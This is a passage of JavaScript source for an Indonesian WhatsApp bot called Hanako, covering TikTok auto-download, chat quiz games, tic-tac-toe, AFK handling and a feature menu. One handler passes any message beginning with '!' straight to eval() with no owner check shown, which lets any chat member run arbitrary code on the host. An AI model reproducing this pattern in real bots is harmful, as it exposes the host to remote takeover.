// Auto download tiktok
  if (budy.startsWith('https://vt.tiktok.com/') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://t.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/')) {
    try {
    const data = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(budy)}`);
    const stats = data.result.statistics;
const caption = `┈──────────────────────⫺
            *T I K T O K A U T O D L*
┈──────────────────────⫺\n*Author*: ${data.result.author.nickname}\n*Like*: ${data.result.statistics.likeCount}\n*Komentar*: ${data.result.statistics.commentCount}\n*Share*: ${data.result.statistics.shareCount}\n*Title*: ${data.result.desc}\n\n_Download By ${global.botname}_`;
const vidnya = data.result.video;
    kyy.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m });
} catch (error) {
    const anub = await fetchJson(`https://api.miftahganzz.my.id/api/download/tiktokv3?url=${encodeURIComponent(budy)}&apikey=miftah`);
    const syavid = anub.data.video;
    kyy.sendMessage(m.chat, { caption: mess.success, video: { url: syavid } }, { quoted: m });
}
  }
  
  if (antibot) {
    if (m.isBaileys && m.fromMe == true){
        if (isAdmins || !isBotAdmins){		  
        } else {
          reply(`*Bot Lain Terdeteksi*\n\nHusshhh Keluar dari grup ini!!!`)
    return await kyy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
  
// FITUR MENGETIK
if (global.autoTyping) {
if (command) { kyy.sendPresenceUpdate('composing', from)}}

// AUTO READ MESSAGE
if (global.autoTyping) {
if (command) { kyy.readMessages([m.key])}}

//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: kyy.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, kyy.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
kyy.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('!')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
//==================================================//
try {
ppuser = await kyy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
    let isNumber = x => typeof x === 'number' && !isNaN(x)
    let limitUser = isPrem ? 1000 : 15
    let user = global.db.data.users[m.sender]
    
    if (typeof user !== 'object') global.db.data.users[m.sender] = {}
    
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

let isNumber = x => typeof x === 'number' && !isNaN(x)
let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!isNumber(setting.status)) setting.status = 0
                if (autobio) {
        let _uptime = process.uptime() * 1000
		let uptime = clockString(_uptime)
		await kyy.updateProfileStatus(`I am ${botname} | Aktif Selama ${uptime} ⏳ | Mode : ${kyy.public ? 'Public-Mode' : 'Self-Mode'}`).catch(_ => _)
        }
if (autoread) {
kyy.readMessages([m.key])
        }
        
            } else global.db.data.settings[botNumber] = {
                status: 0,
                autobio: false,
                autoread: false
            }
            //=================================================//
if (('family100'+from in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
kyy.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   kyy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 kyy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 kyy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 kyy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 kyy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 kyy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 kyy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await kyy.sendText(room.x, str, m, { mentions: parseMention(str) } )
await kyy.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
kyy.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
kyy.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) kyy.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) kyy.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) kyy.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
kyy.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) kyy.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) kyy.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
kyy.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

function pickMoji(list) {
     return list[Math.floor(Math.random() * list.length)]
  }

async function falseR () {
kyy.sendReact(m.chat, '❌', m.key)
}

async function loading () {
var kayy = [
`${pickMoji(['🙄','🤯','🗿','💬','🤨','🥴','😐','👆','😔','👀','👎','🥶','💯','🔥','👍','❓️','⏳️','💥','🤙'])}`,
`${pickMoji(['😨','😅','😂','😳','😎','🥵','😱','🐦','🙄','🐤','🗿','💬','🤨','🥴','😐','👆','😔','👀','👎','🥶','💯','🔥','♻️','〽️','⚠️'])}`,
`${pickMoji(['😨','😅','😂','😳','💭','🗯','🥶','💯','🔥','👍','❓️','⏳️','💥','🤙'])}`,
`${pickMoji(['😳','💭','🗯','🥶','💯','🔥','👍','❓️','⏳️','💥','🤙'])}`,
`${pickMoji(['😨','😅','😂','😳','😎','🥵','😱','🐦','🙄','🐤','💣','😔','👀','👎','🥶','💯','💤','💨','🔥','👍','❓️','⏳️','💥','🤙'])}`,
]
let { key } = await kyy.sendReact(m.chat, `${pickMoji(['😨','😅','😂','😳','😎','🥵','😱','🐦','🙄','🐤','🗿','💬','🤨','🥴','😐','👆','😔','👀','👎','🥶','💯','🔥','👍','❓️','⏳️','💥','🤙'])}`, m.key)//Pengalih isu

for (let i = 0; i < kayy.length; i++) {
await sleep(65)
await kyy.sendReact(m.chat, kayy[i], m.key)
//PESAN LEPAS
}
}


//BATAS
//==================================================//
switch(command) {
case "menu": {
if (!isRegistered) return reply(mess.regis)
let limitz = db.data.users[m.sender].limit;
menuu = `👋Happy ${salam} @${m?.sender.split('@')[0]} ,, ʜᴀɴᴀᴋᴏ ʜᴀɴᴀᴋᴏ ɪꜱ ᴀ ᴘᴇʀꜰᴏʀᴍᴀɴᴄᴇ ꜱʏꜱᴛᴇᴍ ᴛʜᴀᴛ ɪꜱ ᴀᴜᴛᴏᴍᴀᴛɪᴄ ᴀɴᴅ ᴏɴʟɪɴᴇ 24 ʜᴏᴜʀꜱ ᴀ ᴅᴀʏ, ʜᴀɴᴀᴋᴏ ɪꜱ ʀᴇᴀᴅʏ ᴛᴏ ꜱᴇʀᴠᴇ ʏᴏᴜ ᴀɴᴅ ᴀᴄᴄᴏᴍᴘᴀɴʏ ʏᴏᴜ ᴀɴᴅ ꜰɪɴᴅ ᴡʜᴀᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴀꜱ ᴀʙᴏᴠᴇ ,,  ꜰᴏʀ ᴏᴛʜᴇʀ ꜰᴇᴀᴛᴜʀᴇꜱ ᴀɴᴅ ʙᴏᴛ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ᴀʀᴇ ʙᴇʟᴏᴡ 

 ◦ ᴀʟʟᴍᴇɴᴜ [ ꜱᴇʟᴜʀᴜʜ ꜰɪᴛᴜʀ ]
 ◦ ᴏᴡɴᴇʀ [ ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ ]
 ◦ ꜱᴇᴡᴀ [ ᴜɴᴛᴜᴋ ᴍᴇɴʏᴇᴡᴀ ]
 ◦ ʀᴜʟᴇꜱ [ ʀᴜʟᴇꜱ ʙᴏᴛ ]
 
 ᴅᴏɴ'ᴛ ꜱᴘᴀᴍ, ᴘʟᴇᴀꜱᴇ ɢɪᴠᴇ ᴀ 5 ꜱᴇᴄᴏɴᴅ ᴘᴀᴜꜱᴇ ᴘᴇʀ ᴄᴏᴍᴍᴀɴᴅ ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ᴏᴡɴᴇʀ ᴡɪʟʟ ʙᴀɴ ʏᴏᴜ
 `
kyy.sendMessage(m?.chat, {
text: menuu,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `Hanako - AI`,
body: 'Welcome To Hanako Bot WhatsAp',
thumbnailUrl: 'https://telegra.ph/file/28993e1ea3d7e3b710c6d.png',
sourceUrl: 'https://saweria.co/kyyyoshi',
mediaType: 1,
renderLargerThumbnail: true
}
}
}
)
await kyy.sendMessage(m.chat, {audio: fs.readFileSync('./Vn/sepuh.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "allmenu": {
if (!isRegistered) return reply(mess.regis)
let limitz = db.data.users[m.sender].limit;
menuu = `ʜᴀɪ @${m?.sender.split('@')[0]} selamat ${salam} sᴀʏᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ *ʜᴀɴᴀᴋᴏ ᴀɪ* sᴀʏᴀ ᴅɪ ʀᴀɴᴄᴀɴɢ ᴀɢᴀʀ ᴅᴀᴘᴀᴛ ᴍᴇɴᴇᴍᴀɴɪ ᴀɴᴅᴀ ᴅᴀɴ ᴅᴀᴘᴀᴛ ᴍᴇɴᴄᴀrɪ ɪɴғᴏʀᴍᴀsɪ - iɴғᴏʀᴍᴀsɪ ᴍᴇɴᴀʀɪᴋ ʜᴀɴʏᴀ ᴅɪ ᴡʜᴀᴛsᴀᴘᴘ sᴀᴊᴀ ʜᴀɴᴀᴋᴏ ᴀᴋᴀɴ sʟᴀʟᴜ ᴏɴ ᴊɪᴋᴀ ᴛɪᴅᴀᴋ ɴᴏᴍᴏʀ ɴʏ ᴋᴇ ʙᴀɴᴅ

> ＩＮＦＯ ＵＳＥＲ
乂 ɴᴏᴍᴏʀ : @${m?.sender.split('@')[0]}
乂 ɴᴀᴍᴀ : ${pushname}
乂 ʟɪᴍɪᴛ : ${limitz}
乂 ꜱᴛᴀᴛᴜꜱᴜꜱᴇʀ : ${isCreator ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ꜰʀᴇᴇ'}
乂 ᴛᴇʀᴅᴀꜰᴛᴀʀ : ʏᴇꜱ
乂 ꜱᴀʟᴅᴏ : Rp ${toRupiah(cekSaldo(sender, db_saldo))}

> ＩＮＦＯ ＢＯＴ
乂 ʙᴏᴛ ɴᴀᴍᴇ : ${global.botname}
乂 ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ${global.ownername}
乂 ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}
乂 ɴᴏ ᴏᴡɴᴇʀ : 6288286326619
乂 ᴠᴇʀꜱɪᴏɴ : 5.0.0
乂 ᴛᴏᴛᴀʟ ꜰɪᴛᴜʀ : ${totalFitur()}  ꜰɪᴛᴜʀ

> UCAPAN WAKTU
- Waktu : ${salam}
- Jam : ${time}

┈─────────────────┈⫺
*メ O W N E R M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴀᴅᴅᴘʀᴇᴍ
     ヤ ◦ ᴀᴅᴅᴘʀᴇᴍ
     ヤ ◦ ᴅᴇʟᴘʀᴇᴍ
     ヤ ◦ ʙᴄɢᴄ
     ヤ ◦ ɪᴘʙᴏᴛ
     ヤ ◦ ʟᴇᴀᴠᴇɢᴄ
     ヤ ◦ ꜱᴇᴛʙɪᴏʙᴏᴛ
     ヤ ◦ ᴅᴇʟᴇᴛᴇᴘᴘʙᴏᴛ
     ヤ ◦ ᴅᴇʟᴄʜᴀᴛ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ɪɴᴠɪᴛᴇ
     ヤ ◦ ʙᴄɪᴍɢ
     ヤ ◦ ʀᴇꜱᴛᴀʀᴛ
     ヤ ◦ ᴅᴇʟᴄᴀꜱᴇ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ꜱᴇʟꜰ
     ヤ ◦ addlimit
     ヤ ◦ resetlimit
     ヤ ◦ ᴅᴇʟᴄᴀꜱᴇ
     ヤ ◦ ᴀᴅᴅᴄᴀꜱᴇ
     ヤ ◦ ᴘᴜʙʟɪᴄ
     ヤ ◦ ᴀᴜᴛᴏʀᴇᴀᴅ
     ヤ ◦ ᴀᴜᴛᴏʙɪᴏ
     ヤ ◦ ɢᴇᴛᴄᴀꜱᴇ
     ヤ ◦ ʀᴇᴀᴅᴄʜᴀɴɢᴇ
     ヤ ◦ ʙɪᴏᴄʜᴀɴɢᴇ
     ヤ ◦ ꜱᴇᴛᴘᴘʙᴏᴛ
     ヤ ◦ ᴜɴʙʟᴄᴏᴋ
     ヤ ◦ ʙʟᴏᴄᴋ
     ヤ ◦ ᴄʀᴇᴀᴛᴇɢᴄ
     ヤ ◦ ʟɪꜱᴛᴘᴄ
     ヤ ◦ ᴊᴏɪɴ

┈─────────────────┈⫺
*メ F U N M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴄᴀɴᴛɪᴋᴄᴇᴋ
     ヤ ◦ ᴡᴀɴɢʏ
     ヤ ◦ ꜱᴀɴɢᴇᴄᴇᴋ
     ヤ ◦ ᴋᴀᴘᴀɴᴋᴀʜ
     ヤ ◦ ʀᴀᴛᴇ
     ヤ ◦ ᴊᴏᴍᴏᴋᴄᴇᴋ
     ヤ ◦ ɢᴀɴᴛᴇɴɢᴄᴇᴋ
     ヤ ◦ ᴄᴇᴋᴀꜱᴀʟᴍᴇᴍʙᴇʀ
     ヤ ◦ Qᴄ
     ヤ ◦ ᴛᴛꜱ
     ヤ ◦ ᴛɪᴋᴛᴏᴋꜱᴛᴀʟᴋ
     ヤ ◦ ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
     ヤ ◦ ʀᴠᴏ
     ヤ ◦ ᴜᴘꜱᴡ
     ヤ ◦ ɢᴇᴛꜱᴡ
     ヤ ◦ ʟɪꜱᴛꜱᴡ
     ヤ ◦ ᴛᴏᴛᴀʟꜰɪᴛᴜʀᴇ
     ヤ ◦ ꜰᴇɴɢꜱʜᴜɪ
     ヤ ◦ ᴀʀᴛɪᴛᴀʀᴏᴛ
     ヤ ◦ ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ
     ヤ ◦ ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ
     ヤ ◦ ᴘᴇᴋᴇʀᴊᴀᴀɴ
     ヤ ◦ ʀᴇᴊᴇᴋɪ
     ヤ ◦ ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ
     ヤ ◦ ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ
     ヤ ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ
     ヤ ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴᴀᴍᴀ
     ヤ ◦ ᴀʀᴛɪɴᴀᴍᴀ
     ヤ ◦ ʀᴀᴍᴀʟᴀɴᴊᴏᴅᴏʜ
     ヤ ◦ ᴀʀᴛɪᴍɪᴍᴘɪ
     ヤ ◦ ᴇᴍᴏᴊɪᴍɪx2
     ヤ ◦ ᴇᴍᴏᴊɪᴍɪx
     ヤ ◦ ᴄᴏᴜᴘʟᴇ
     ヤ ◦ ᴀᴘᴀᴋᴀʜ
     ヤ ◦ ᴀꜰᴋ
     ヤ ◦ cekkhodam
     ヤ ◦ cekkhodam2

┈─────────────────┈⫺
*メ A N T I M E N U メ*   
┈─────────────────┈⫺
     ヤ ◦ ᴀɴᴛɪʙᴏᴛ
     ヤ ◦ ᴀɴᴛɪᴡᴀᴍᴇ
     ヤ ◦ ᴀɴᴛɪᴀꜱɪɴɢ
     ヤ ◦ ᴀɴᴛɪᴠɪʀᴛᴇx
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋᴀʟʟ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋꜰʙ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋʏᴛ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋʏᴛᴄʜ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋɪɢ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋᴛᴇʟᴇ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋᴛɪᴋᴛᴏᴋ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋᴛᴡɪᴛᴛᴇʀ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋ

┈─────────────────┈⫺     
*メ T O P U P M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ pembayarandm
     ヤ ◦ topup
     ヤ ◦ pubg
     ヤ ◦ ml
     ヤ ◦ ff

┈─────────────────┈⫺
*メ D E P O S I T M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴅᴀɴᴀ
     ヤ ◦ ʙᴜʏꜱᴄ
     ヤ ◦ 1gbsaldo
     ヤ ◦ 2gbsaldo
     ヤ ◦ 3gbsaldo
     ヤ ◦ 4gbsaldo
     ヤ ◦ 5gbsaldo
     ヤ ◦ 6gbsaldo
     ヤ ◦ 7gbsaldo
     ヤ ◦ 8gbsaldo
     ヤ ◦ unlisaldo
     ヤ ◦ ᴀᴅᴅꜱᴀʟᴅᴏ
     ヤ ◦ ᴍɪɴꜱᴀʟᴅᴏ
     ヤ ◦ buysrv
     ヤ ◦ buyschanakov5
     ヤ ◦ ꜱᴀʟᴅᴏ
     ヤ ◦ pembayaran
     ヤ ◦ dana
     ヤ ◦ qria
     ヤ ◦ depo
     ヤ ◦ saldo

┈─────────────────┈⫺
*メ B E R I T A M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ꜰᴀᴊᴀʀ
     ヤ ◦ ᴄɴɴ
     ヤ ◦ ʟᴀʏᴀʀᴋᴀᴄᴀ
     ヤ ◦ ᴄɴʙᴄ
     ヤ ◦ ᴛʀɪʙᴜɴ
     ヤ ◦ ɪɴᴅᴏᴢᴏɴᴇ
     ヤ ◦ ᴋᴏᴍᴘᴀꜱ
     ヤ ◦ ᴅᴇᴛɪᴋ
     ヤ ◦ ᴅᴀɪʟʏ
     ヤ ◦ ɪɴᴇᴡꜱ
     ヤ ◦ ᴏᴋᴇᴢᴏɴᴇ
     ヤ ◦ ꜱɪɴᴅᴏ
     ヤ ◦ ᴛᴇᴍᴘᴏ
     ヤ ◦ ᴀɴᴛᴀʀᴀ
     ヤ ◦ ᴋᴏɴᴛᴀɴ
     ヤ ◦ ᴍᴇʀᴅᴇᴋᴀ
     ヤ ◦ ᴊᴀʟᴀɴᴛɪᴋᴜꜱ-ᴍᴇᴍᴇ
     ヤ ◦ ɢᴇᴍᴘᴀ
     ヤ ◦ ɢᴇᴍᴘᴀ
     ヤ ◦ ᴀꜰᴋ

┈─────────────────┈⫺
*メ C U C I M A T A M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴄᴇᴄᴀɴɪɴᴅᴏ
     ヤ ◦ ᴄᴇᴄᴀɴᴄʜɪɴᴀ
     ヤ ◦ ᴄᴇᴄᴀɴʜɪᴊᴀʙᴇʀ
     ヤ ◦ ᴄᴇᴄᴀɴᴍᴀʟᴀʏꜱɪᴀ
